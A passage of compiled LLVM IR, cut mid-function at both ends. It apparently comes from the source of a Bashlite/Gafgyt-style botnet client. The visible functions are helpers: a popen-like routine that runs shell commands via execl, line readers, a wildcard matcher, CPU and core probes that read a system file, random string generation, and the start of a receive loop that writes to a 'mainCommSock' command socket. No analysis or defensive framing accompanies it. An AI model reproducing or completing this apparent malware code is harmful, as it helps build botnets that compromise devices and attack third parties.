  %62 = call i32 @close(i32 %61)
  store i32 -1, i32* %3, align 4
  br label %125

; <label>:63:                                     ; preds = %54
  %64 = load i8*, i8** %5, align 8
  %65 = load i8, i8* %64, align 1
  %66 = zext i8 %65 to i32
  %67 = icmp eq i32 %66, 114
  br i1 %67, label %68, label %83

; <label>:68:                                     ; preds = %63
  %69 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %70 = load i32, i32* %69, align 4
  %71 = icmp ne i32 %70, 1
  br i1 %71, label %72, label %79

; <label>:72:                                     ; preds = %68
  %73 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %74 = load i32, i32* %73, align 4
  %75 = call i32 @dup2(i32 %74, i32 1) #5
  %76 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %77 = load i32, i32* %76, align 4
  %78 = call i32 @close(i32 %77)
  br label %79

; <label>:79:                                     ; preds = %72, %68
  %80 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %81 = load i32, i32* %80, align 4
  %82 = call i32 @close(i32 %81)
  br label %98

; <label>:83:                                     ; preds = %63
  %84 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %85 = load i32, i32* %84, align 4
  %86 = icmp ne i32 %85, 0
  br i1 %86, label %87, label %94

; <label>:87:                                     ; preds = %83
  %88 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %89 = load i32, i32* %88, align 4
  %90 = call i32 @dup2(i32 %89, i32 0) #5
  %91 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %92 = load i32, i32* %91, align 4
  %93 = call i32 @close(i32 %92)
  br label %94

; <label>:94:                                     ; preds = %87, %83
  %95 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %96 = load i32, i32* %95, align 4
  %97 = call i32 @close(i32 %96)
  br label %98

; <label>:98:                                     ; preds = %94, %79
  %99 = load i8*, i8** %4, align 8
  %100 = call i32 (i8*, i8*, ...) @execl(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.35, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.36, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.37, i32 0, i32 0), i8* %99, i8* null) #5
  call void @_exit(i32 127) #12
  unreachable

; <label>:101:                                    ; preds = %54
  %102 = load i8*, i8** %5, align 8
  %103 = load i8, i8* %102, align 1
  %104 = zext i8 %103 to i32
  %105 = icmp eq i32 %104, 114
  br i1 %105, label %106, label %112

; <label>:106:                                    ; preds = %101
  %107 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %108 = load i32, i32* %107, align 4
  store i32 %108, i32* %6, align 4
  %109 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %110 = load i32, i32* %109, align 4
  %111 = call i32 @close(i32 %110)
  br label %118

; <label>:112:                                    ; preds = %101
  %113 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %114 = load i32, i32* %113, align 4
  store i32 %114, i32* %6, align 4
  %115 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %116 = load i32, i32* %115, align 4
  %117 = call i32 @close(i32 %116)
  br label %118

; <label>:118:                                    ; preds = %112, %106
  %119 = load i32, i32* %9, align 4
  %120 = load i32*, i32** @fdopen_pids, align 8
  %121 = load i32, i32* %6, align 4
  %122 = sext i32 %121 to i64
  %123 = getelementptr inbounds i32, i32* %120, i64 %122
  store i32 %119, i32* %123, align 4
  %124 = load i32, i32* %6, align 4
  store i32 %124, i32* %3, align 4
  br label %125

; <label>:125:                                    ; preds = %118, %56, %47, %37, %30, %25
  %126 = load i32, i32* %3, align 4
  ret i32 %126
}

; Function Attrs: nounwind
declare i32 @pipe(i32*) #2

; Function Attrs: nounwind
declare i32 @getdtablesize() #2

; Function Attrs: nounwind returns_twice
declare i32 @vfork() #6

declare i32 @close(i32) #4

; Function Attrs: nounwind
declare i32 @dup2(i32, i32) #2

; Function Attrs: nounwind
declare i32 @execl(i8*, i8*, ...) #2

; Function Attrs: noreturn
declare void @_exit(i32) #7

; Function Attrs: noinline nounwind uwtable
define i32 @fdpclose(i32) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca %struct.__sigset_t, align 8
  %6 = alloca %struct.__sigset_t, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca %struct.in_addr, align 4
  store i32 %0, i32* %3, align 4
  %10 = load i32*, i32** @fdopen_pids, align 8
  %11 = icmp eq i32* %10, null
  br i1 %11, label %19, label %12

; <label>:12:                                     ; preds = %1
  %13 = load i32*, i32** @fdopen_pids, align 8
  %14 = load i32, i32* %3, align 4
  %15 = sext i32 %14 to i64
  %16 = getelementptr inbounds i32, i32* %13, i64 %15
  %17 = load i32, i32* %16, align 4
  %18 = icmp eq i32 %17, 0
  br i1 %18, label %19, label %20

; <label>:19:                                     ; preds = %12, %1
  store i32 -1, i32* %2, align 4
  br label %62

; <label>:20:                                     ; preds = %12
  %21 = load i32, i32* %3, align 4
  %22 = call i32 @close(i32 %21)
  %23 = call i32 @sigemptyset(%struct.__sigset_t* %6) #5
  %24 = call i32 @sigaddset(%struct.__sigset_t* %6, i32 2) #5
  %25 = call i32 @sigaddset(%struct.__sigset_t* %6, i32 3) #5
  %26 = call i32 @sigaddset(%struct.__sigset_t* %6, i32 1) #5
  %27 = call i32 @sigprocmask(i32 0, %struct.__sigset_t* %6, %struct.__sigset_t* %5) #5
  br label %28

; <label>:28:                                     ; preds = %42, %20
  %29 = load i32*, i32** @fdopen_pids, align 8
  %30 = load i32, i32* %3, align 4
  %31 = sext i32 %30 to i64
  %32 = getelementptr inbounds i32, i32* %29, i64 %31
  %33 = load i32, i32* %32, align 4
  %34 = call i32 @waitpid(i32 %33, i32* %7, i32 0)
  store i32 %34, i32* %8, align 4
  br label %35

; <label>:35:                                     ; preds = %28
  %36 = load i32, i32* %8, align 4
  %37 = icmp eq i32 %36, -1
  br i1 %37, label %38, label %42

; <label>:38:                                     ; preds = %35
  %39 = call i32* @__errno_location() #13
  %40 = load i32, i32* %39, align 4
  %41 = icmp eq i32 %40, 4
  br label %42

; <label>:42:                                     ; preds = %38, %35
  %43 = phi i1 [ false, %35 ], [ %41, %38 ]
  br i1 %43, label %28, label %44

; <label>:44:                                     ; preds = %42
  %45 = call i32 @sigprocmask(i32 2, %struct.__sigset_t* %5, %struct.__sigset_t* null) #5
  %46 = load i32*, i32** @fdopen_pids, align 8
  %47 = load i32, i32* %4, align 4
  %48 = sext i32 %47 to i64
  %49 = getelementptr inbounds i32, i32* %46, i64 %48
  store i32 0, i32* %49, align 4
  %50 = load i32, i32* %8, align 4
  %51 = icmp eq i32 %50, -1
  br i1 %51, label %52, label %53

; <label>:52:                                     ; preds = %44
  br label %60

; <label>:53:                                     ; preds = %44
  %54 = bitcast %struct.in_addr* %9 to i32*
  %55 = load i32, i32* %7, align 4
  store i32 %55, i32* %54, align 4
  %56 = bitcast %struct.in_addr* %9 to i32*
  %57 = load i32, i32* %56, align 4
  %58 = and i32 %57, 65280
  %59 = ashr i32 %58, 8
  br label %60

; <label>:60:                                     ; preds = %53, %52
  %61 = phi i32 [ -1, %52 ], [ %59, %53 ]
  store i32 %61, i32* %2, align 4
  br label %62

; <label>:62:                                     ; preds = %60, %19
  %63 = load i32, i32* %2, align 4
  ret i32 %63
}

; Function Attrs: nounwind
declare i32 @sigemptyset(%struct.__sigset_t*) #2

; Function Attrs: nounwind
declare i32 @sigaddset(%struct.__sigset_t*, i32) #2

; Function Attrs: nounwind
declare i32 @sigprocmask(i32, %struct.__sigset_t*, %struct.__sigset_t*) #2

declare i32 @waitpid(i32, i32*, i32) #4

; Function Attrs: nounwind readnone
declare i32* @__errno_location() #8

; Function Attrs: noinline nounwind uwtable
define i8* @fdgets(i8*, i32, i32) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  store i32 %2, i32* %6, align 4
  store i32 1, i32* %7, align 4
  store i32 0, i32* %8, align 4
  br label %9

; <label>:9:                                      ; preds = %27, %3
  %10 = load i32, i32* %7, align 4
  %11 = icmp eq i32 %10, 1
  br i1 %11, label %12, label %25

; <label>:12:                                     ; preds = %9
  %13 = load i32, i32* %8, align 4
  %14 = load i32, i32* %5, align 4
  %15 = icmp slt i32 %13, %14
  br i1 %15, label %16, label %25

; <label>:16:                                     ; preds = %12
  %17 = load i8*, i8** %4, align 8
  %18 = load i32, i32* %8, align 4
  %19 = sext i32 %18 to i64
  %20 = getelementptr inbounds i8, i8* %17, i64 %19
  %21 = getelementptr inbounds i8, i8* %20, i64 -1
  %22 = load i8, i8* %21, align 1
  %23 = zext i8 %22 to i32
  %24 = icmp ne i32 %23, 10
  br label %25

; <label>:25:                                     ; preds = %16, %12, %9
  %26 = phi i1 [ false, %12 ], [ false, %9 ], [ %24, %16 ]
  br i1 %26, label %27, label %37

; <label>:27:                                     ; preds = %25
  %28 = load i32, i32* %6, align 4
  %29 = load i8*, i8** %4, align 8
  %30 = load i32, i32* %8, align 4
  %31 = sext i32 %30 to i64
  %32 = getelementptr inbounds i8, i8* %29, i64 %31
  %33 = call i64 @read(i32 %28, i8* %32, i64 1)
  %34 = trunc i64 %33 to i32
  store i32 %34, i32* %7, align 4
  %35 = load i32, i32* %8, align 4
  %36 = add nsw i32 %35, 1
  store i32 %36, i32* %8, align 4
  br label %9

; <label>:37:                                     ; preds = %25
  %38 = load i32, i32* %7, align 4
  %39 = icmp eq i32 %38, 0
  br i1 %39, label %40, label %41

; <label>:40:                                     ; preds = %37
  br label %43

; <label>:41:                                     ; preds = %37
  %42 = load i8*, i8** %4, align 8
  br label %43

; <label>:43:                                     ; preds = %41, %40
  %44 = phi i8* [ null, %40 ], [ %42, %41 ]
  ret i8* %44
}

declare i64 @read(i32, i8*, i64) #4

; Function Attrs: noinline nounwind uwtable
define i64 @parseHex(i8*) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i64, align 8
  store i8* %0, i8** %2, align 8
  store i64 0, i64* %3, align 8
  br label %4

; <label>:4:                                      ; preds = %14, %1
  %5 = load i8*, i8** %2, align 8
  %6 = load i8, i8* %5, align 1
  %7 = zext i8 %6 to i32
  %8 = icmp ne i32 %7, 0
  br i1 %8, label %9, label %12

; <label>:9:                                      ; preds = %4
  %10 = load i64, i64* %3, align 8
  %11 = icmp sge i64 %10, 0
  br label %12

; <label>:12:                                     ; preds = %9, %4
  %13 = phi i1 [ false, %4 ], [ %11, %9 ]
  br i1 %13, label %14, label %24

; <label>:14:                                     ; preds = %12
  %15 = load i64, i64* %3, align 8
  %16 = shl i64 %15, 4
  %17 = load i8*, i8** %2, align 8
  %18 = getelementptr inbounds i8, i8* %17, i32 1
  store i8* %18, i8** %2, align 8
  %19 = load i8, i8* %17, align 1
  %20 = zext i8 %19 to i64
  %21 = getelementptr inbounds [256 x i64], [256 x i64]* @hextable, i64 0, i64 %20
  %22 = load i64, i64* %21, align 8
  %23 = or i64 %16, %22
  store i64 %23, i64* %3, align 8
  br label %4

; <label>:24:                                     ; preds = %12
  %25 = load i64, i64* %3, align 8
  ret i64 %25
}

; Function Attrs: noinline nounwind uwtable
define i32 @wildString(i8*, i8*) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  store i8* %0, i8** %4, align 8
  store i8* %1, i8** %5, align 8
  %6 = load i8*, i8** %4, align 8
  %7 = load i8, i8* %6, align 1
  %8 = zext i8 %7 to i32
  switch i32 %8, label %54 [
    i32 0, label %9
    i32 42, label %13
    i32 63, label %37
  ]

; <label>:9:                                      ; preds = %2
  %10 = load i8*, i8** %5, align 8
  %11 = load i8, i8* %10, align 1
  %12 = zext i8 %11 to i32
  store i32 %12, i32* %3, align 4
  br label %76

; <label>:13:                                     ; preds = %2
  %14 = load i8*, i8** %4, align 8
  %15 = getelementptr inbounds i8, i8* %14, i64 1
  %16 = load i8*, i8** %5, align 8
  %17 = call i32 @wildString(i8* %15, i8* %16)
  %18 = icmp ne i32 %17, 0
  br i1 %18, label %19, label %33

; <label>:19:                                     ; preds = %13
  %20 = load i8*, i8** %5, align 8
  %21 = load i8, i8* %20, align 1
  %22 = zext i8 %21 to i32
  %23 = icmp ne i32 %22, 0
  br i1 %23, label %24, label %31

; <label>:24:                                     ; preds = %19
  %25 = load i8*, i8** %4, align 8
  %26 = load i8*, i8** %5, align 8
  %27 = getelementptr inbounds i8, i8* %26, i64 1
  %28 = call i32 @wildString(i8* %25, i8* %27)
  %29 = icmp ne i32 %28, 0
  %30 = xor i1 %29, true
  br label %31

; <label>:31:                                     ; preds = %24, %19
  %32 = phi i1 [ false, %19 ], [ %30, %24 ]
  br label %33

; <label>:33:                                     ; preds = %31, %13
  %34 = phi i1 [ true, %13 ], [ %32, %31 ]
  %35 = xor i1 %34, true
  %36 = zext i1 %35 to i32
  store i32 %36, i32* %3, align 4
  br label %76

; <label>:37:                                     ; preds = %2
  %38 = load i8*, i8** %5, align 8
  %39 = load i8, i8* %38, align 1
  %40 = zext i8 %39 to i32
  %41 = icmp ne i32 %40, 0
  br i1 %41, label %42, label %50

; <label>:42:                                     ; preds = %37
  %43 = load i8*, i8** %4, align 8
  %44 = getelementptr inbounds i8, i8* %43, i64 1
  %45 = load i8*, i8** %5, align 8
  %46 = getelementptr inbounds i8, i8* %45, i64 1
  %47 = call i32 @wildString(i8* %44, i8* %46)
  %48 = icmp ne i32 %47, 0
  %49 = xor i1 %48, true
  br label %50

; <label>:50:                                     ; preds = %42, %37
  %51 = phi i1 [ false, %37 ], [ %49, %42 ]
  %52 = xor i1 %51, true
  %53 = zext i1 %52 to i32
  store i32 %53, i32* %3, align 4
  br label %76

; <label>:54:                                     ; preds = %2
  %55 = load i8*, i8** %4, align 8
  %56 = load i8, i8* %55, align 1
  %57 = zext i8 %56 to i32
  %58 = call i32 @toupper(i32 %57) #10
  %59 = load i8*, i8** %5, align 8
  %60 = load i8, i8* %59, align 1
  %61 = zext i8 %60 to i32
  %62 = call i32 @toupper(i32 %61) #10
  %63 = icmp eq i32 %58, %62
  br i1 %63, label %64, label %72

; <label>:64:                                     ; preds = %54
  %65 = load i8*, i8** %4, align 8
  %66 = getelementptr inbounds i8, i8* %65, i64 1
  %67 = load i8*, i8** %5, align 8
  %68 = getelementptr inbounds i8, i8* %67, i64 1
  %69 = call i32 @wildString(i8* %66, i8* %68)
  %70 = icmp ne i32 %69, 0
  %71 = xor i1 %70, true
  br label %72

; <label>:72:                                     ; preds = %64, %54
  %73 = phi i1 [ false, %54 ], [ %71, %64 ]
  %74 = xor i1 %73, true
  %75 = zext i1 %74 to i32
  store i32 %75, i32* %3, align 4
  br label %76

; <label>:76:                                     ; preds = %72, %50, %33, %9
  %77 = load i32, i32* %3, align 4
  ret i32 %77
}

; Function Attrs: nounwind readonly
declare i32 @toupper(i32) #1

; Function Attrs: noinline nounwind uwtable
define i32 @getHost(i8*, %struct.in_addr*) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca %struct.in_addr*, align 8
  %6 = alloca %struct.hostent*, align 8
  store i8* %0, i8** %4, align 8
  store %struct.in_addr* %1, %struct.in_addr** %5, align 8
  %7 = load i8*, i8** %4, align 8
  %8 = call i32 @inet_addr(i8* %7) #5
  %9 = load %struct.in_addr*, %struct.in_addr** %5, align 8
  %10 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %9, i32 0, i32 0
  store i32 %8, i32* %10, align 4
  %11 = icmp eq i32 %8, -1
  br i1 %11, label %12, label %13

; <label>:12:                                     ; preds = %2
  store i32 1, i32* %3, align 4
  br label %14

; <label>:13:                                     ; preds = %2
  store i32 0, i32* %3, align 4
  br label %14

; <label>:14:                                     ; preds = %13, %12
  %15 = load i32, i32* %3, align 4
  ret i32 %15
}

; Function Attrs: nounwind
declare i32 @inet_addr(i8*) #2

; Function Attrs: noinline nounwind uwtable
define void @uppercase(i8*) #0 {
  %2 = alloca i8*, align 8
  store i8* %0, i8** %2, align 8
  br label %3

; <label>:3:                                      ; preds = %7, %1
  %4 = load i8*, i8** %2, align 8
  %5 = load i8, i8* %4, align 1
  %6 = icmp ne i8 %5, 0
  br i1 %6, label %7, label %16

; <label>:7:                                      ; preds = %3
  %8 = load i8*, i8** %2, align 8
  %9 = load i8, i8* %8, align 1
  %10 = zext i8 %9 to i32
  %11 = call i32 @toupper(i32 %10) #10
  %12 = trunc i32 %11 to i8
  %13 = load i8*, i8** %2, align 8
  store i8 %12, i8* %13, align 1
  %14 = load i8*, i8** %2, align 8
  %15 = getelementptr inbounds i8, i8* %14, i32 1
  store i8* %15, i8** %2, align 8
  br label %3

; <label>:16:                                     ; preds = %3
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i32 @getBogos(i8*) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca [4096 x i8], align 16
  %6 = alloca i8*, align 8
  store i8* %0, i8** %3, align 8
  %7 = call i32 (i8*, i32, ...) @open(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.38, i32 0, i32 0), i32 0)
  store i32 %7, i32* %4, align 4
  br label %8

; <label>:8:                                      ; preds = %82, %1
  %9 = getelementptr inbounds [4096 x i8], [4096 x i8]* %5, i32 0, i32 0
  %10 = load i32, i32* %4, align 4
  %11 = call i8* @fdgets(i8* %9, i32 4096, i32 %10)
  %12 = icmp ne i8* %11, null
  br i1 %12, label %13, label %84

; <label>:13:                                     ; preds = %8
  %14 = getelementptr inbounds [4096 x i8], [4096 x i8]* %5, i32 0, i32 0
  call void @uppercase(i8* %14)
  %15 = getelementptr inbounds [4096 x i8], [4096 x i8]* %5, i32 0, i32 0
  %16 = call i8* @strstr(i8* %15, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.39, i32 0, i32 0)) #10
  %17 = getelementptr inbounds [4096 x i8], [4096 x i8]* %5, i32 0, i32 0
  %18 = icmp eq i8* %16, %17
  br i1 %18, label %19, label %82

; <label>:19:                                     ; preds = %13
  %20 = getelementptr inbounds [4096 x i8], [4096 x i8]* %5, i32 0, i32 0
  %21 = getelementptr inbounds i8, i8* %20, i64 8
  store i8* %21, i8** %6, align 8
  br label %22

; <label>:22:                                     ; preds = %39, %19
  %23 = load i8*, i8** %6, align 8
  %24 = load i8, i8* %23, align 1
  %25 = zext i8 %24 to i32
  %26 = icmp eq i32 %25, 32
  br i1 %26, label %37, label %27

; <label>:27:                                     ; preds = %22
  %28 = load i8*, i8** %6, align 8
  %29 = load i8, i8* %28, align 1
  %30 = zext i8 %29 to i32
  %31 = icmp eq i32 %30, 9
  br i1 %31, label %37, label %32

; <label>:32:                                     ; preds = %27
  %33 = load i8*, i8** %6, align 8
  %34 = load i8, i8* %33, align 1
  %35 = zext i8 %34 to i32
  %36 = icmp eq i32 %35, 58
  br label %37

; <label>:37:                                     ; preds = %32, %27, %22
  %38 = phi i1 [ true, %27 ], [ true, %22 ], [ %36, %32 ]
  br i1 %38, label %39, label %42

; <label>:39:                                     ; preds = %37
  %40 = load i8*, i8** %6, align 8
  %41 = getelementptr inbounds i8, i8* %40, i32 1
  store i8* %41, i8** %6, align 8
  br label %22

; <label>:42:                                     ; preds = %37
  br label %43

; <label>:43:                                     ; preds = %63, %42
  %44 = load i8*, i8** %6, align 8
  %45 = load i8*, i8** %6, align 8
  %46 = call i64 @strlen(i8* %45) #10
  %47 = sub i64 %46, 1
  %48 = getelementptr inbounds i8, i8* %44, i64 %47
  %49 = load i8, i8* %48, align 1
  %50 = zext i8 %49 to i32
  %51 = icmp eq i32 %50, 13
  br i1 %51, label %61, label %52

; <label>:52:                                     ; preds = %43
  %53 = load i8*, i8** %6, align 8
  %54 = load i8*, i8** %6, align 8
  %55 = call i64 @strlen(i8* %54) #10
  %56 = sub i64 %55, 1
  %57 = getelementptr inbounds i8, i8* %53, i64 %56
  %58 = load i8, i8* %57, align 1
  %59 = zext i8 %58 to i32
  %60 = icmp eq i32 %59, 10
  br label %61

; <label>:61:                                     ; preds = %52, %43
  %62 = phi i1 [ true, %43 ], [ %60, %52 ]
  br i1 %62, label %63, label %69

; <label>:63:                                     ; preds = %61
  %64 = load i8*, i8** %6, align 8
  %65 = load i8*, i8** %6, align 8
  %66 = call i64 @strlen(i8* %65) #10
  %67 = sub i64 %66, 1
  %68 = getelementptr inbounds i8, i8* %64, i64 %67
  store i8 0, i8* %68, align 1
  br label %43

; <label>:69:                                     ; preds = %61
  %70 = load i8*, i8** %6, align 8
  %71 = call i8* @strchr(i8* %70, i32 46) #10
  %72 = icmp ne i8* %71, null
  br i1 %72, label %73, label %76

; <label>:73:                                     ; preds = %69
  %74 = load i8*, i8** %6, align 8
  %75 = call i8* @strchr(i8* %74, i32 46) #10
  store i8 0, i8* %75, align 1
  br label %76

; <label>:76:                                     ; preds = %73, %69
  %77 = load i8*, i8** %3, align 8
  %78 = load i8*, i8** %6, align 8
  %79 = call i8* @strcpy(i8* %77, i8* %78) #5
  %80 = load i32, i32* %4, align 4
  %81 = call i32 @close(i32 %80)
  store i32 0, i32* %2, align 4
  br label %87

; <label>:82:                                     ; preds = %13
  %83 = getelementptr inbounds [4096 x i8], [4096 x i8]* %5, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %83, i8 0, i64 4096, i32 16, i1 false)
  br label %8

; <label>:84:                                     ; preds = %8
  %85 = load i32, i32* %4, align 4
  %86 = call i32 @close(i32 %85)
  store i32 1, i32* %2, align 4
  br label %87

; <label>:87:                                     ; preds = %84, %76
  %88 = load i32, i32* %2, align 4
  ret i32 %88
}

declare i32 @open(i8*, i32, ...) #4

; Function Attrs: nounwind readonly
declare i8* @strstr(i8*, i8*) #1

; Function Attrs: nounwind readonly
declare i8* @strchr(i8*, i32) #1

; Function Attrs: nounwind
declare i8* @strcpy(i8*, i8*) #2

; Function Attrs: noinline nounwind uwtable
define i32 @getCores() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca [4096 x i8], align 16
  store i32 0, i32* %1, align 4
  %4 = call i32 (i8*, i32, ...) @open(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.38, i32 0, i32 0), i32 0)
  store i32 %4, i32* %2, align 4
  br label %5

; <label>:5:                                      ; preds = %19, %0
  %6 = getelementptr inbounds [4096 x i8], [4096 x i8]* %3, i32 0, i32 0
  %7 = load i32, i32* %2, align 4
  %8 = call i8* @fdgets(i8* %6, i32 4096, i32 %7)
  %9 = icmp ne i8* %8, null
  br i1 %9, label %10, label %21

; <label>:10:                                     ; preds = %5
  %11 = getelementptr inbounds [4096 x i8], [4096 x i8]* %3, i32 0, i32 0
  call void @uppercase(i8* %11)
  %12 = getelementptr inbounds [4096 x i8], [4096 x i8]* %3, i32 0, i32 0
  %13 = call i8* @strstr(i8* %12, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.39, i32 0, i32 0)) #10
  %14 = getelementptr inbounds [4096 x i8], [4096 x i8]* %3, i32 0, i32 0
  %15 = icmp eq i8* %13, %14
  br i1 %15, label %16, label %19

; <label>:16:                                     ; preds = %10
  %17 = load i32, i32* %1, align 4
  %18 = add nsw i32 %17, 1
  store i32 %18, i32* %1, align 4
  br label %19

; <label>:19:                                     ; preds = %16, %10
  %20 = getelementptr inbounds [4096 x i8], [4096 x i8]* %3, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %20, i8 0, i64 4096, i32 16, i1 false)
  br label %5

; <label>:21:                                     ; preds = %5
  %22 = load i32, i32* %2, align 4
  %23 = call i32 @close(i32 %22)
  %24 = load i32, i32* %1, align 4
  ret i32 %24
}

; Function Attrs: noinline nounwind uwtable
define void @makeRandomStr(i8*, i32) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  store i32 %1, i32* %4, align 4
  store i32 0, i32* %5, align 4
  store i32 0, i32* %5, align 4
  br label %6

; <label>:6:                                      ; preds = %19, %2
  %7 = load i32, i32* %5, align 4
  %8 = load i32, i32* %4, align 4
  %9 = icmp slt i32 %7, %8
  br i1 %9, label %10, label %22

; <label>:10:                                     ; preds = %6
  %11 = call i32 @rand_cmwc()
  %12 = urem i32 %11, 26
  %13 = add i32 %12, 65
  %14 = trunc i32 %13 to i8
  %15 = load i8*, i8** %3, align 8
  %16 = load i32, i32* %5, align 4
  %17 = sext i32 %16 to i64
  %18 = getelementptr inbounds i8, i8* %15, i64 %17
  store i8 %14, i8* %18, align 1
  br label %19

; <label>:19:                                     ; preds = %10
  %20 = load i32, i32* %5, align 4
  %21 = add nsw i32 %20, 1
  store i32 %21, i32* %5, align 4
  br label %6

; <label>:22:                                     ; preds = %6
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i32 @recvLine(i32, i8*, i32) #0 {
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca %struct.__sigset_t, align 8
  %9 = alloca %struct.timeval, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i8, align 1
  %17 = alloca i8*, align 8
  %18 = alloca i32, align 4
  store i32 %0, i32* %5, align 4
  store i8* %1, i8** %6, align 8
  store i32 %2, i32* %7, align 4
  %19 = load i8*, i8** %6, align 8
  %20 = load i32, i32* %7, align 4
  %21 = sext i32 %20 to i64
  call void @llvm.memset.p0i8.i64(i8* %19, i8 0, i64 %21, i32 1, i1 false)
  %22 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 0
  store i64 30, i64* %22, align 8
  %23 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 1
  store i64 0, i64* %23, align 8
  br label %24

; <label>:24:                                     ; preds = %3
  %25 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %8, i32 0, i32 0
  %26 = getelementptr inbounds [16 x i64], [16 x i64]* %25, i64 0, i64 0
  %27 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %26) #5, !srcloc !1
  %28 = extractvalue { i64, i64* } %27, 0
  %29 = extractvalue { i64, i64* } %27, 1
  %30 = trunc i64 %28 to i32
  store i32 %30, i32* %10, align 4
  %31 = ptrtoint i64* %29 to i64
  %32 = trunc i64 %31 to i32
  store i32 %32, i32* %11, align 4
  br label %33

; <label>:33:                                     ; preds = %24
  %34 = load i32, i32* %5, align 4
  %35 = srem i32 %34, 64
  %36 = zext i32 %35 to i64
  %37 = shl i64 1, %36
  %38 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %8, i32 0, i32 0
  %39 = load i32, i32* %5, align 4
  %40 = sdiv i32 %39, 64
  %41 = sext i32 %40 to i64
  %42 = getelementptr inbounds [16 x i64], [16 x i64]* %38, i64 0, i64 %41
  %43 = load i64, i64* %42, align 8
  %44 = or i64 %43, %37
  store i64 %44, i64* %42, align 8
  %45 = load i32, i32* %5, align 4
  %46 = add nsw i32 %45, 1
  %47 = call i32 @select(i32 %46, %struct.__sigset_t* %8, %struct.__sigset_t* null, %struct.__sigset_t* %8, %struct.timeval* %9)
  store i32 %47, i32* %12, align 4
  %48 = icmp sle i32 %47, 0
  br i1 %48, label %49, label %88

; <label>:49:                                     ; preds = %33
  br label %50

; <label>:50:                                     ; preds = %83, %49
  %51 = load i32, i32* %13, align 4
  %52 = icmp slt i32 %51, 10
  br i1 %52, label %53, label %87

; <label>:53:                                     ; preds = %50
  %54 = load i32, i32* @mainCommSock, align 4
  %55 = call i32 (i32, i8*, ...) @sockprintf(i32 %54, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.40, i32 0, i32 0))
  %56 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 0
  store i64 30, i64* %56, align 8
  %57 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 1
  store i64 0, i64* %57, align 8
  br label %58

; <label>:58:                                     ; preds = %53
  %59 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %8, i32 0, i32 0
  %60 = getelementptr inbounds [16 x i64], [16 x i64]* %59, i64 0, i64 0
  %61 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %60) #5, !srcloc !2
  %62 = extractvalue { i64, i64* } %61, 0
  %63 = extractvalue { i64, i64* } %61, 1
  %64 = trunc i64 %62 to i32
  store i32 %64, i32* %14, align 4
  %65 = ptrtoint i64* %63 to i64
  %66 = trunc i64 %65 to i32
  store i32 %66, i32* %15, align 4
  br label %67

; <label>:67:                                     ; preds = %58
  %68 = load i32, i32* %5, align 4
  %69 = srem i32 %68, 64
  %70 = zext i32 %69 to i64
  %71 = shl i64 1, %70
  %72 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %8, i32 0, i32 0
  %73 = load i32, i32* %5, align 4
  %74 = sdiv i32 %73, 64
  %75 = sext i32 %74 to i64
  %76 = getelementptr inbounds [16 x i64], [16 x i64]* %72, i64 0, i64 %75
